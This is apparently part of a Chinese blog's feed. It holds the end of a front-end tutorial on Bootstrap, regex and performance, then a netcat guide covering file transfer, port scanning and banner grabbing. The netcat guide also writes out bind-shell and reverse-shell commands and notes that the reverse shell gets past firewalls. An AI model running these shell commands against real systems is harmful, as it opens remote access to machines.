class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;button <span class="class"><span class="keyword">class</span></span>=<span class="string">"btn btn-primary"</span> data-toggle=<span class="string">"modal"</span> data-target=<span class="string">"#mymodal"</span>&gt;大弹出框按钮&lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">&lt;div class="modal fade" id="mymodal"&gt;</span></span><br><span class="line"><span class="regexp">        &lt;div class="modal-dialog modal-lg"&gt;</span></span><br><span class="line"><span class="regexp">            &lt;div class="modal-content"&gt;</span></span><br><span class="line"><span class="regexp">                &lt;div class="modal-header"&gt;</span></span><br><span class="line"><span class="regexp">                    大尺寸弹出框</span></span><br><span class="line"><span class="regexp">                &lt;/</span>div&gt;</span><br><span class="line">                &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"modal-body"</span>&gt;</span><br><span class="line">                    模态框主体</span><br><span class="line">                  &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">                  &lt;div class="modal-footer"&gt;</span></span><br><span class="line"><span class="regexp">                    &lt;button type="button" class="btn btn-default"  data-dismiss="modal"&gt;Close&lt;/</span>button&gt;</span><br><span class="line">                    &lt;button type=<span class="string">"button"</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">"btn btn-primary"</span>&gt;Save changes&lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp">                  &lt;/</span>div&gt;</span><br><span class="line">            &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">        &lt;/</span>div&gt;</span><br><span class="line">&lt;<span class="regexp">/div&gt;</span></span><br></pre></td></tr></table></figure><h3 id="11-4-13-bootstrap-下拉菜单"><a href="#11-4-13-bootstrap-下拉菜单" class="headerlink" title="11.4.13 bootstrap 下拉菜单"></a>11.4.13 bootstrap 下拉菜单</h3><p>1、dropdown-toggle<br>2、dropdown-menu </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"row"</span>&gt;            </span><br><span class="line">    &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"dropdown"</span>&gt;</span><br><span class="line">        &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"btn btn-primary  dropdown-toggle"</span> data-toggle=<span class="string">"dropdown"</span>&gt;</span><br><span class="line">            下拉菜单</span><br><span class="line">            &lt;span <span class="class"><span class="keyword">class</span></span>=<span class="string">"caret"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line">        &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">        &lt;ul class="dropdown-menu"&gt;</span></span><br><span class="line"><span class="regexp">            &lt;li&gt;&lt;a href="#"&gt;菜单一&lt;/</span>a&gt;<span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">            &lt;li&gt;<span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>菜单二<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">            &lt;li&gt;<span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>菜单三<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">        &lt;<span class="regexp">/ul&gt;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>div&gt;</span><br><span class="line">&lt;<span class="regexp">/div&gt;</span></span><br></pre></td></tr></table></figure><h3 id="11-4-14-bootstrap-隐藏类"><a href="#11-4-14-bootstrap-隐藏类" class="headerlink" title="11.4.14 bootstrap 隐藏类"></a>11.4.14 bootstrap 隐藏类</h3><p>1、hidden-xs<br>2、hidden-sm<br>3、hidden-md<br>4、hidden-lg </p><h1 id="12-正则表达式"><a href="#12-正则表达式" class="headerlink" title="12. 正则表达式"></a>12. 正则表达式</h1><h2 id="12-1-什么是正则表达式"><a href="#12-1-什么是正则表达式" class="headerlink" title="12.1 什么是正则表达式"></a>12.1 什么是正则表达式</h2><p>能让计算机读懂的字符串匹配规则。 </p><h2 id="12-2-正则表达式的写法"><a href="#12-2-正则表达式的写法" class="headerlink" title="12.2 正则表达式的写法"></a>12.2 正则表达式的写法</h2><p>var re=new RegExp(‘规则’, ‘可选参数’);<br>var re=/规则/参数; </p><h2 id="12-3-规则中的字符"><a href="#12-3-规则中的字符" class="headerlink" title="12.3 规则中的字符"></a>12.3 规则中的字符</h2><p>1）普通字符匹配：<br>如：/a/  匹配字符 ‘a’，/a,b/  匹配字符 ‘a,b’ </p><p>2）转义字符匹配：<br>\d   匹配一个数字，即0-9<br>\D   匹配一个非数字，即除了0-9<br>\w   匹配一个单词字符（字母、数字、下划线）<br>\W   匹配任何非单词字符。等价于[^A-Za-z0-9_]<br>\s   匹配一个空白符<br>\S   匹配一个非空白符<br>\b   匹配单词边界<br>\B   匹配非单词边界<br>.    匹配一个任意字符</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> sTr01 = <span class="string">'123456asdf'</span>;</span><br><span class="line"><span class="keyword">var</span> re01 = <span class="regexp">/\d+/</span>;</span><br><span class="line"><span class="comment">//匹配纯数字字符串</span></span><br><span class="line"><span class="keyword">var</span> re02 = <span class="regexp">/^\d+$/</span>;</span><br><span class="line">alert(re01.test(sTr01)); <span class="comment">//弹出true</span></span><br><span class="line">alert(re02.test(sTr01)); <span class="comment">//弹出false</span></span><br></pre></td></tr></table></figure><h2 id="12-4-量词：对左边的匹配字符定义个数"><a href="#12-4-量词：对左边的匹配字符定义个数" class="headerlink" title="12.4 量词：对左边的匹配字符定义个数"></a>12.4 量词：对左边的匹配字符定义个数</h2><p>? 出现零次或一次（最多出现一次）<br>+ 出现一次或多次（至少出现一次）<br>* 出现零次或多次（任意次）<br>{n} 出现n次<br>{n,m} 出现n到m次<br>{n,} 至少出现n次  </p><h2 id="12-5-任意一个或者范围"><a href="#12-5-任意一个或者范围" class="headerlink" title="12.5 任意一个或者范围"></a>12.5 任意一个或者范围</h2><p>[abc123] : 匹配‘abc123’中的任意一个字符<br>[a-z0-9] : 匹配a到z或者0到9中的任意一个字符 </p><h2 id="12-6-限制开头结尾"><a href="#12-6-限制开头结尾" class="headerlink" title="12.6 限制开头结尾"></a>12.6 限制开头结尾</h2><p>^  以紧挨的元素开头<br>$  以紧挨的元素结尾 </p><h2 id="12-7-修饰参数"><a href="#12-7-修饰参数" class="headerlink" title="12.7 修饰参数"></a>12.7 修饰参数</h2><p>g： global，全文搜索，默认搜索到第一个结果接停止<br>i： ingore case，忽略大小写，默认大小写敏感</p><h2 id="12-8-常用函数"><a href="#12-8-常用函数" class="headerlink" title="12.8 常用函数"></a>12.8 常用函数</h2><p>1、test<br>用法：正则.test(字符串)  匹配成功，就返回真，否则就返回假  </p><p>2、replace<br>用法：字符串.replace(正则，新的字符串) 匹配成功的字符去替换新的字符 </p><h2 id="12-9-正则默认规则"><a href="#12-9-正则默认规则" class="headerlink" title="12.9 正则默认规则"></a>12.9 正则默认规则</h2><p>匹配成功就结束，不会继续匹配，区分大小写</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> sTr01 = <span class="string">'abcdefedcbaCef'</span>;</span><br><span class="line"><span class="keyword">var</span> re01 = <span class="regexp">/c/</span>;</span><br><span class="line"><span class="keyword">var</span> re02 = <span class="regexp">/c/g</span>;</span><br><span class="line"><span class="keyword">var</span> re03 = <span class="regexp">/c/gi</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> sTr02 = sTr01.replace(re01,<span class="string">'*'</span>);</span><br><span class="line"><span class="keyword">var</span> sTr03 = sTr01.replace(re02,<span class="string">'*'</span>);</span><br><span class="line"><span class="keyword">var</span> sTr04 = sTr01.replace(re03,<span class="string">'*'</span>);</span><br><span class="line">alert(sTr02); <span class="comment">// 弹出 ab*defedcbaCef</span></span><br><span class="line">alert(sTr03); <span class="comment">// 弹出 ab*defed*baCef</span></span><br><span class="line">alert(sTr04); <span class="comment">// 弹出 ab*defed*ba*ef</span></span><br></pre></td></tr></table></figure><h2 id="12-10-常用正则规则"><a href="#12-10-常用正则规则" class="headerlink" title="12.10 常用正则规则"></a>12.10 常用正则规则</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//用户名验证：(数字字母或下划线6到20位)</span></span><br><span class="line"><span class="keyword">var</span> reUser = <span class="regexp">/^\w&#123;6,20&#125;$/</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//邮箱验证：        </span></span><br><span class="line"><span class="keyword">var</span> reMail = <span class="regexp">/^[a-z0-9][\w\.\-]*@[a-z0-9\-]+(\.[a-z]&#123;2,5&#125;)&#123;1,2&#125;$/i</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//密码验证：</span></span><br><span class="line"><span class="keyword">var</span> rePass = <span class="regexp">/^[\w!@#$%^&amp;*]&#123;6,20&#125;$/</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//手机号码验证：</span></span><br><span class="line"><span class="keyword">var</span> rePhone = <span class="regexp">/^1[3458]\d&#123;9&#125;$/</span>;</span><br></pre></td></tr></table></figure><h1 id="13-前端性能优化"><a href="#13-前端性能优化" class="headerlink" title="13. 前端性能优化"></a>13. 前端性能优化</h1><p>从用户访问资源到资源完整的展现在用户面前的过程中，通过技术手段和优化策略，缩短每个步骤的处理时间从而提升整个资源的访问和呈现速度。网站的性能直接会影响到用户的数量，所有前端性能优化很重要。</p><p>前端性能优化分为如下几个方面：</p><h2 id="13-1代码部署"><a href="#13-1代码部署" class="headerlink" title="13.1代码部署"></a>13.1代码部署</h2><p>1、代码的压缩与合并<br>2、图片、js、css等静态资源使用和主站不同域名地址存储，从而使得在传输资源时不会带上不必要的cookie信息。<br>3、使用内容分发网络 CDN<br>4、为文件设置Last-Modified、Expires和Etag<br>5、使用GZIP压缩传送<br>6、权衡DNS查找次数(使用不同域名会增加DNS查找)<br>7、避免不必要的重定向(加”/“)  </p><h2 id="13-2-编码"><a href="#13-2-编码" class="headerlink" title="13.2 编码"></a>13.2 编码</h2><h3 id="13-2-1-html"><a href="#13-2-1-html" class="headerlink" title="13.2.1 html"></a>13.2.1 html</h3><p>1、使用结构清晰，简单，语义化标签<br>2、避免空的src和href<br>3、不要在HTML中缩放图片 </p><h3 id="13-2-2-css"><a href="#13-2-2-css" class="headerlink" title="13.2.2 css"></a>13.2.2 css</h3><p>1、精简css选择器<br>2、把CSS放到顶部<br>3、避免@import方式引入样式<br>4、css中使用base64图片数据取代图片文件，减少请求数，在线转base64网站：<a href="http://tool.css-js.com/base64.html">http://tool.css-js.com/base64.html</a><br>5、使用css动画来取代javascript动画<br>6、使用字体图标<br>7、使用css sprite(雪碧图)<br>8、使用svg图形<br>9、避免使用CSS表达式  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">body&#123;</span><br><span class="line"> background-color: expression( (<span class="keyword">new</span> <span class="built_in">Date</span>()).getSeconds()%<span class="number">2</span> ? <span class="string">"#B8D4FF"</span> : <span class="string">"#F08A00"</span> );  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>10、避免使用css滤镜 </p><h3 id="13-2-3-javascript"><a href="#13-2-3-javascript" class="headerlink" title="13.2.3 javascript"></a>13.2.3 javascript</h3><p>1、减少引用库的个数<br>2、使用requirejs或seajs异步加载js<br>3、JS放到页面底部引入<br>4、避免全局查找<br>5、使用原生方法<br>6、用switch语句代替复杂的if else语句<br>7、减少语句数，比如说多个变量声明可以写成一句<br>8、使用字面量表达式来初始化数组或者对象<br>9、使用innerHTML取代复杂的元素注入<br>10、使用事件代理(事件委托)<br>11、避免多次访问dom选择集<br>12、高频触发事件设置使用函数节流<br>13、使用Web Storage缓存数据 </p></script></p><!-- rebuild by neat -->]]></content>
    
    <summary type="html">
    
      &lt;!-- build time:Tue Dec 31 2019 14:32:00 GMT+0800 (GMT+08:00) --&gt;&lt;h1 id=&quot;1-前端开发概述&quot;&gt;&lt;a href=&quot;#1-前端开发概述&quot; class=&quot;headerlink&quot; title=&quot;1. 前端开发概述&quot;&gt;&lt;/a&gt;1. 前端开发概述&lt;/h1&gt;&lt;p&gt;包括html、css、PC端及移动端布局技巧、javascript、jquery、js特效制作、ajax前后台交互等。&lt;/p&gt;&lt;h2 id=&quot;1-1-什么是前端开发？&quot;&gt;&lt;a href=&quot;#1-1-什么是前端开发？&quot; class=&quot;headerlink&quot; title=&quot;1.1 什么是前端开发？&quot;&gt;&lt;/a&gt;1.1 什么是前端开发？&lt;/h2&gt;&lt;p&gt;前端开发也叫做web前端开发，它指的是基于web的互联网产品的页面(也可叫界面)开发及功能开发。&lt;/p&gt;&lt;h2 id=&quot;1-2-什么互联网产品？&quot;&gt;&lt;a href=&quot;#1-2-什么互联网产品？&quot; class=&quot;headerlink&quot; title=&quot;1.2 什么互联网产品？&quot;&gt;&lt;/a&gt;1.2 什么互联网产品？&lt;/h2&gt;&lt;p&gt;互联网产品就是指网站为满足用户需求而创建的用于运营的功能及服务，百度搜索、淘宝、QQ、微博、网易邮箱等都是互联网产品。&lt;/p&gt;&lt;h2 id=&quot;1-3-互联网产品开发流程及前端开发岗位？&quot;&gt;&lt;a href=&quot;#1-3-互联网产品开发流程及前端开发岗位？&quot; class=&quot;headerlink&quot; title=&quot;1.3 互联网产品开发流程及前端开发岗位？&quot;&gt;&lt;/a&gt;1.3 互联网产品开发流程及前端开发岗位？&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/qianduan_images/001.jpg&quot; alt&gt;&lt;/p&gt;&lt;h2 id=&quot;1-4-前端开发需要哪些技术？&quot;&gt;&lt;a href=&quot;#1-4-前端开发需要哪些技术？&quot; class=&quot;headerlink&quot; title=&quot;1.4 前端开发需要哪些技术？&quot;&gt;&lt;/a&gt;1.4 前端开发需要哪些技术？&lt;/h2&gt;&lt;p&gt;前端工程师参照产品的效果图来开发页面(也可叫界面)，效果图是由UI设计师用Photoshop(少量设计师用firework)来设计的，为了方便与UI设计师对接工作，前端需要掌握一些Photoshop的技能，Photoshop还可以辅助页面开发。把效果图布局成页面，需要用到HTML语言和CSS语言，页面功能的开发需要用到javascript,为了快速开发和系统开发，还需要学习一些前端的javascript库和框架。&lt;/p&gt;
    
    </summary>
    
      <category term="HTML&amp;CSS&amp;JavaScript|JQuery" scheme="https://yongnights.github.io/categories/HTML-CSS-JavaScript-JQuery/"/>
    
    
      <category term="JavaScript" scheme="https://yongnights.github.io/tags/JavaScript/"/>
    
      <category term="HTML" scheme="https://yongnights.github.io/tags/HTML/"/>
    
      <category term="CSS" scheme="https://yongnights.github.io/tags/CSS/"/>
    
      <category term="JQuery" scheme="https://yongnights.github.io/tags/JQuery/"/>
    
  </entry>
  
  <entry>
    <title>使用nc传输超大文件</title>
    <link href="https://yongnights.github.io/2019/12/31/%E4%BD%BF%E7%94%A8nc%E4%BC%A0%E8%BE%93%E8%B6%85%E5%A4%A7%E6%96%87%E4%BB%B6/"/>
    <id>https://yongnights.github.io/2019/12/31/使用nc传输超大文件/</id>
    <published>2019-12-31T04:00:48.277Z</published>
    <updated>2019-12-31T04:00:48.277Z</updated>
    
    <content type="html"><![CDATA[<!-- build time:Tue Dec 31 2019 14:31:59 GMT+0800 (GMT+08:00) --><h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><pre><code>linux下的文件传输，大家首先会想到rsync、scp之类的工具，但这类工具有一个特点——慢，因为这类工具都是加密传输，发送端加密，接收端解密，当我们传输一些非敏感文件的时候，完全可以不加密，直接在网络上传输。</code></pre><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><pre><code>1. linux系统安装# yum install -y nc | nmap-ncatps.ubuntu自带的nc是netcat-openbsd版,不带-c/-e参数。2. windows系统安装(1)下载下载netcat。下载地址：https://eternallybored.org/misc/netcat/, </code></pre><p><img src="/nc/1.png" alt></p><pre><code>(2)解压文件夹(3)将文件夹所在路径添加到用户环境变量里(4)打开命令界面：Windows+R  cmd。输入nc 命令即可</code></pre><a id="more"></a><h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><pre><code>想要连接到某处: nc [-options] hostname port[s] [ports] …绑定端口等待连接: nc -l port [-options] [hostname] [port]-g&lt;网关&gt;：设置路由器跃程通信网关，最多设置8个;-G&lt;指向器数目&gt;：设置来源路由指向器，其数值为4的倍数;-h：在线帮助;-i&lt;延迟秒数&gt;：设置时间间隔，以便传送信息及扫描通信端口;-l：使用监听模式，监控传入的资料;-n：直接使用ip地址，而不通过域名服务器;-o&lt;输出文件&gt;：指定文件名称，把往来传输的数据以16进制字码倾倒成该文件保存;-p&lt;通信端口&gt;：设置本地主机使用的通信端口;-r：指定源端口和目的端口都进行随机的选择;-s&lt;来源位址&gt;：设置本地主机送出数据包的IP地址;-u：使用UDP传输协议;-v：显示指令执行过程;-w&lt;超时秒数&gt;：设置等待连线的时间;-z：使用0输入/输出模式，只在扫描通信端口时使用。</code></pre><h3 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h3><h4 id="连接远程主机"><a href="#连接远程主机" class="headerlink" title="连接远程主机"></a>连接远程主机</h4><pre><code>Client连接到Server的TCP 80端口: $nc -nvv 192.168.x.x 8000Server监听本机的TCP8000端口: $nc -l 8000超时控制:多数情况我们不希望连接一直保持，那么我们可以使用 -w 参数来指定连接的空闲超时时间，该参数紧接一个数值，代表秒数，如果连接超过指定时间则连接会被终止。Server: $nc -l 2389Client: $nc -w 10 localhost 2389该连接将在 10 秒后中断。注意: 不要在服务器端同时使用 -w 和 -l 参数，因为 -w 参数将在服务器端无效果。</code></pre><h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><pre><code>端口扫描经常被系统管理员和黑客用来发现在一些机器上开放的端口，帮助他们识别系统中的漏洞。$nc -z -v -n 192.168.1.1 21-25可以运行在TCP或者UDP模式，默认是TCP，-u参数调整为udp.z 参数告诉netcat使用0 IO,连接成功后立即关闭连接， 不进行数据交换.v 参数指详细输出.n 参数告诉netcat 不要使用DNS反向查询IP地址的域名.以上命令会打印21到25 所有开放的端口。$nc -v 127.0.0.1 22localhost [127.0.0.1] 22 (ssh) openSSH-2.0-OpenSSH_5.9p1 Debian-5ubuntu1.4&quot;SSH-2.0-OpenSSH_5.9p1 Debian-5ubuntu1.4&quot;为Banner信息。Banner是一个文本，Banner是一个你连接的服务发送给你的文本信息。当你试图鉴别漏洞或者服务的类型和版本的时候，Banner信息是非常有用的。但是，并不是所有的服务都会发送banner.一旦你发现开放的端口，你可以容易的使用netcat 连接服务抓取他们的banner。</code></pre><h4 id="Chat-Server"><a href="#Chat-Server" class="headerlink" title="Chat Server"></a>Chat Server</h4><pre><code>内网聊天,netcat提供了这样一种方法，只需要创建一个Chat服务器，一个预先确定好的端口，这样子就可以在内网聊天沟通了.Server: $nc -l 20000netcat 命令在20000端口启动了一个tcp 服务器，所有的标准输出和输入会输出到该端口。输出和输入都在此shell中展示。Client:$nc 192.168.1.1 20000不管你在机器Client上键入什么都会出现在机器Server上。</code></pre><h4 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h4><pre><code>linux下的文件传输，大家首先会想到rsync、scp之类的工具，但这类工具有一个特点——慢，因为这类工具都是加密传输，发送端加密，接收端解密，当我们传输一些非敏感文件的时候，完全可以不加密，直接在网络上传输。Server: $ time nc -l 20000 &lt; file.txt命令最前面的time是用来检测该命令运行耗时的。Client: $nc -n 192.168.1.1 20000 &gt; file.txt我们创建了一个服务器在A上并且重定向netcat的输入为文件file.txt，那么当任何成功连接到该端口，netcat会发送file的文件内容。在客户端我们重定向输出到file.txt，当B连接到A，A发送文件内容，B保存文件内容到file.txt.没有必要创建文件源作为Server，我们也可以相反的方法使用。像下面的我们发送文件从B到A，但是服务器创建在A上，这次我们仅需要重定向netcat的输出并且重定向B的输入文件。B作为ServerServer: $nc -l 20000 &gt; file.txt   Client: $nc 192.168.1.2 20000 &lt; file.txt用nc传输有两个特点：➤速度快➤传输简单，不需要登录对方服务器，不需要验证信息。nc进度显示若你文件实在太大，想看到传输进度，用PVyum install epel-release -yyum install pv -ycat file.txt |pv -b | nc  192.168.1.1 20000</code></pre><h4 id="中转文件"><a href="#中转文件" class="headerlink" title="中转文件"></a>中转文件</h4><pre><code>A、B、C三台主机，A美国，C日本，C只能访问到B，不能直接访问A，B和AC互通。C要怎么才能拿到A上的文件呢？C上执行：nc -l 9999 &gt; google_file.txtB上执行：nc -l 9999 | nc (C的外网IP) 9999A上执行：nc (B的外网IP) 9999 &lt; google_file.txt</code></pre><h4 id="目录传输"><a href="#目录传输" class="headerlink" title="目录传输"></a>目录传输</h4><pre><code>想要发送多个文件，或者整个目录，一样很简单，只需要使用压缩工具tar，压缩后发送压缩包。如果你想要通过网络传输一个目录从A到B。Server: $tar -cvf – dir_name | nc -l 20000Client: $nc -n 192.168.1.1 20000 | tar -xvf -在A服务器上，我们创建一个tar归档包并且通过-在控制台重定向它，然后使用管道，重定向给netcat，netcat可以通过网络发送它。在客户端我们下载该压缩包通过netcat 管道然后打开文件。如果想要节省带宽传输压缩包，我们可以使用bzip2或者其他工具压缩。Server: $tar -cvf – dir_name| bzip2 -z | nc -l 20000通过bzip2压缩Client: $nc -n 192.168.1.1 20000 | bzip2 -d |tar -xvf -还可以把目录制作成iso文件进行传输$ yum install mkisofsmkisofs -r -o 路径/ISO 文件名 目录文件路径例子：mkisofs -r -o /opt/mycd.iso /home</code></pre><h4 id="加密通过网络发送的数据"><a href="#加密通过网络发送的数据" class="headerlink" title="加密通过网络发送的数据"></a>加密通过网络发送的数据</h4><pre><code>如果担心你在网络上发送数据的安全，可以在发送你的数据之前用如mcrypt的工具加密。使用mcrypt工具加密数据。Server: $nc localhost 20000 | mcrypt –flush –bare -F -q -d -m ecb &gt; file.txt使用mcrypt工具解密数据。Client: $mcrypt –flush –bare -F -q -m ecb &lt; file.txt | nc -l 20000以上两个命令会提示需要密码，确保两端使用相同的密码。这里我们是使用mcrypt用来加密，使用其它任意加密工具都可以。</code></pre><h4 id="流视频"><a href="#流视频" class="headerlink" title="流视频"></a>流视频</h4><pre><code>虽然不是生成流视频的最好方法，但如果服务器上没有特定的工具，使用netcat，我们仍然有希望做成这件事。这里我们只是从一个视频文件中读入并重定向输出到netcat客户端Server: $cat video.avi | nc -l 20000这里我们从socket中读入数据并重定向到mplayer。Client: $nc 192.168.1.1 20000 | mplayer -vo x11 -cache 3000 -</code></pre><h4 id="克隆一个设备"><a href="#克隆一个设备" class="headerlink" title="克隆一个设备"></a>克隆一个设备</h4><pre><code>如果你已经安装配置一台Linux机器并且需要重复同样的操作对其他的机器，而你不想在重复配置一遍。不在需要重复配置安装的过程，只启动另一台机器的一些引导可以随身碟和克隆你的机器。克隆Linux PC很简单，假如你的系统在磁盘/dev/sda上Server: $dd if=/dev/sda | nc -l 20000Client: $nc -n 192.168.1.1 20000 | dd of=/dev/sdadd是一个从磁盘读取原始数据的工具，我通过netcat服务器重定向它的输出流到其他机器并且写入到磁盘中，它会随着分区表拷贝所有的信息。但是如果我们已经做过分区并且只需要克隆root分区，我们可以根据我们系统root分区的位置，更改sda 为sda1，sda2.等等。</code></pre><h4 id="打开一个shell"><a href="#打开一个shell" class="headerlink" title="打开一个shell"></a>打开一个shell</h4><pre><code>假设你的netcat支持 -c -e 参数(原生 netcat)Server: $nc -l 20000 -e /bin/bash -iClient: $nc 192.168.1.1 20000这里我们已经创建了一个netcat服务器并且表示当它连接成功时执行/bin/bash假如netcat 不支持-c 或者 -e 参数（openbsd netcat）,我们仍然能够创建远程shellServer: $mkfifo /tmp/tmp_fifo$cat /tmp/tmp_fifo | /bin/sh -i 2&gt;&amp;1 | nc -l 20000 &gt; /tmp/tmp_fifo这里我们创建了一个fifo文件，然后使用管道命令把这个fifo文件内容定向到shell 2&gt;&amp;1中。2&gt;&amp;1是用来重定向标准错误输出和标准输出，然后管道到netcat 运行的端口20000上。至此，我们已经把netcat的输出重定向到fifo文件中。说明：从网络收到的输入写到fifo文件中cat 命令读取fifo文件并且其内容发送给sh命令sh命令进程受到输入并把它写回到netcat。netcat 通过网络发送输出到client至于为什么会成功是因为管道使命令平行执行，fifo文件用来替代正常文件，因为fifo使读取等待而如果是一个普通文件，cat命令会尽快结束并开始读取空文件。在客户端仅仅简单连接到服务器Client: $nc -n 192.168.1.1 20000你会得到一个shell提示符在客户端</code></pre><h4 id="反向shell"><a href="#反向shell" class="headerlink" title="反向shell"></a>反向shell</h4><pre><code>反向shell是指在客户端打开的shell。反向shell这样命名是因为不同于其他配置，这里服务器使用的是由客户提供的服务。Server: $nc -l 20000在客户端，简单地告诉netcat在连接完成后，执行shell。Client: $nc 192.168.1.1 20000 -e /bin/bash现在，什么是反向shell的特别之处呢反向shell经常被用来绕过防火墙的限制，如阻止入站连接。例如，我有一个专用IP地址为192.168.1.1，我使用代理服务器连接到外部网络。如果我想从网络外部访问 这台机器如1.2.3.4的shell，那么我会用反向外壳用于这一目的。</code></pre><p>####　指定源端口<br>假设你的防火墙过滤除25端口外其它所有端口，你需要使用-p选项指定源端口。<br>Server：$nc -l 20000<br>Client：$nc 192.168.1.1 20000 25</p><pre><code>使用1024以内的端口需要root权限。该命令将在客户端开启25端口用于通讯，否则将使用随机端口。</code></pre><h4 id="指定源地址"><a href="#指定源地址" class="headerlink" title="指定源地址"></a>指定源地址</h4><pre><code>假设你的机器有多个地址，希望明确指定使用哪个地址用于外部数据通讯。我们可以在netcat中使用-s选项指定ip地址。Server: $nc -u -l 20000 &lt; file.txtClient: $nc -u 192.168.1.1 20000 -s 172.31.100.5 &gt; file.txt该命令将绑定地址172.31.100.5。</code></pre><h4 id="静态web页面服务器"><a href="#静态web页面服务器" class="headerlink" title="静态web页面服务器"></a>静态web页面服务器</h4><pre><code>新建一个网页,命名为somepage.html;新建一个shell script:while true; do    nc -l 80 -q 1 &lt; somepage.html;done用root权限执行，然后在浏览器中输入127.0.0.1打开看看是否正确运行。nc 指令通常都是给管理者进行除错或测试等作用的，所以如果只是单纯需要临时的网页服务器，使用 Python 的 SimpleHTTPServer 组会比较方便。</code></pre><h4 id="模拟HTTP-Headers"><a href="#模拟HTTP-Headers" class="headerlink" title="模拟HTTP Headers"></a>模拟HTTP Headers</h4><pre><code>$nc www.huanxiangwu.com 80GET / HTTP/1.1Host: ispconfig.orgReferrer: mypage.comUser-Agent: my-browserHTTP/1.1 200 OKDate: Tue, 16 Dec 2008 07:23:24 GMTServer: Apache/2.2.6 (Unix) DAV/2 mod_mono/1.2.1 mod_python/3.2.8 Python/2.4.3 mod_perl/2.0.2 Perl/v5.8.8Set-Cookie: PHPSESSID=bbadorbvie1gn037iih6lrdg50; path=/Expires: 0Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0Pragma: no-cacheCache-Control: private, post-check=0, pre-check=0, max-age=0Set-Cookie: oWn_sid=xRutAY; expires=Tue, 23-Dec-2008 07:23:24 GMT; path=/Vary: Accept-EncodingTransfer-Encoding: chunkedContent-Type: text/html[......]在nc命令后，输入红色部分的内容(命令下方的4行内容)，然后按两次回车，即可从对方获得HTTP Headers内容。</code></pre><h4 id="Netcat支持IPv6"><a href="#Netcat支持IPv6" class="headerlink" title="Netcat支持IPv6"></a>Netcat支持IPv6</h4><pre><code>netcat 的 -4 和 -6 参数用来指定 IP 地址类型，分别是 IPv4 和 IPv6：Server: $ nc -4 -l 2389Client: $ nc -4 localhost 2389然后我们可以使用 netstat 命令来查看网络的情况：$ netstat | grep 2389tcp        0      0 localhost:2389          localhost:50851         ESTABLISHEDtcp        0      0 localhost:50851         localhost:2389          ESTABLISHED接下来我们看看IPv6 的情况：Server: $ nc -6 -l 2389Client: $ nc -6 localhost 2389再次运行 netstat 命令：$ netstat | grep 2389tcp6       0      0 localhost:2389          localhost:33234         ESTABLISHEDtcp6       0      0 localhost:33234         localhost:2389          ESTABLISHED前缀是 tcp6 表示使用的是 IPv6 的地址。</code></pre><h4 id="在-Netcat-中禁止从标准输入中读取数据"><a href="#在-Netcat-中禁止从标准输入中读取数据" class="headerlink" title="在 Netcat 中禁止从标准输入中读取数据"></a>在 Netcat 中禁止从标准输入中读取数据</h4><pre><code>该功能使用 -d 参数，请看下面例子：Server: 